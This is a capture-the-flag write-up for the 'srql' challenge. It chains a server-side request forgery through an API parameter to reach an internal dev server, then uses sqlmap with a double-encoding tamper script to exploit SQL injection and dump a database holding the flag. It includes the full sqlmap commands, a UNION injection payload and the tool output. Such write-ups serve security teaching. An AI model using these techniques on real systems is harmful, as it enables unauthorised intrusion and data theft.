# srql ctf solution
Upon visiting http://srql.d.ctff.fun/ you're greeted with the following index page:

![Index](/srql/solution/img/index_page.png?raw=true "")


Upon inspecting the page / viewing the source we can see that the following HTML / JS is commented out:

```html
<!-- 
  <script>
    $.ajax({url: "api.php?call=changelog", success: function(result){
      $("#news").html(result);
    }});
</script>
-->
```

Jquery's `ajax()` method performs an asynchronous HTTP request, so we visit that endpoint: http://srql.d.ctff.fun/api.php?call=changelog

The response:

```
10/1/2019 - Our newly launched development server is up now at: http://devrandom.corp.d.ctff.fun:8080/
9/30/2019 - Fixed bug in API, some chars in parameters may now need to be encoded more than once to prevent tamper'ing
```

We see the development server "leaked" in the changelog, so attempt to resolve it: 

```
bork@doggos:~# host devrandom.corp.d.ctff.fun
devrandom.corp.d.ctff.fun has address 172.18.0.3
```

As we can see it's an internal ip address, pointing to something internally. A server-side request forgery vulnerability would allow us to hit this developer site. 

Setting the `?call=` parameter at http://srql.d.ctff.fun/api.php to an arbitrary URL: http://example.com

![example.com](/srql/solution/img/ssrf_example.png?raw=true "")

As we can see, the application  is actually making HTTP requests to any url we provide. Let's set it to the developer server we found in the changelog:

![DevServer](/srql/solution/img/dev_server_index.png?raw=true "")

In the response we see a form that submits via GET to `debug.php?name=developers`. Let's append it to the developer server URL: http://srql.d.ctff.fun/api.php?call=http://devrandom.corp.d.ctff.fun:8080/debug.php?name=developers

The page just responds with: `bobby tables`. That's a classic SQL injection joke, let's try seeing what happens if we add an ' to the end of the `?name=` parameter.

```
no results for query: SELECT name FROM developers'
```

It's clearly building SQL queries from our input, so lets try using sqlmap to dump the database:

Since we are using the SSRF to hit this internal server, we need to use the `-p` flag to specify the parameter we want to test. sqlmap will otherwise only attempt to inject the `?call=` parameter. We also will need to use the "chardoubleencode" tamper script – our payloads will need to be double url-encoded. If it's only encoded once, the server will decode them and recognize them as parameters to `http://srql.d.ctff.fun/api.php` and they won't be sent along to `http://devrandom.corp.d.ctff.fun:8080/debug.php` which is where we want them to be.

Let's try it:
```
bork@doggos:~#  python2 sqlmap.py -u "http://srql.d.ctff.fun/api.php?call=http://devrandom.corp.d.ctff.fun:8080/debug.php?name=developers*" --tamper=chardoubleencode -p 'name=' --dbs

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.4.9#dev}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

-- snip --
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 96 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://srql.d.ctff.fun:80/api.php?call=http://devrandom.corp.d.ctff.fun:8080/debug.php?name=developers UNION ALL SELECT CONCAT(CONCAT('qpxzq','InZAMqHlCKAHvNfKiBehKlNjYagoTOfAOUcahufy'),'qpkxq')-- ilEo
---
[21:00:07] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[21:00:07] [INFO] testing MySQL
[21:00:07] [INFO] confirming MySQL
[21:00:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.0
[21:00:07] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] randomcorp

[21:00:07] [INFO] fetched data logged to text files under '/Users/cdl/.sqlmap/output/srql.d.ctff.fun'

[*] ending @ 21:00:07 /2019-10-09/
```

It's injectable! Let's dump the "randomcorp" database with the sqlmap's `--dump` flag:

```
bork@doggos:~#  python2 sqlmap.py -u "http://srql.d.ctff.fun/api.php?call=http://devrandom.corp.d.ctff.fun:8080/debug.php?name=developers*" --tamper=chardoubleencode -p 'name='  -D randomcorp --dump

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.4.9#dev}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

-- snip --

[21:04:44] [INFO] fetching columns for table 'developers' in database 'randomcorp'
[21:04:44] [INFO] fetching entries for table 'developers' in database 'randomcorp'
Database: randomcorp
Table: developers
[1 entry]
+--------------+-------------------------+
| name         | secret                  |
+--------------+-------------------------+
| bobby tables | dsu{w0w_U_rlly_p1v0ted} |
+--------------+-------------------------+
```

Flag: `dsu{w0w_U_rlly_p1v0ted}`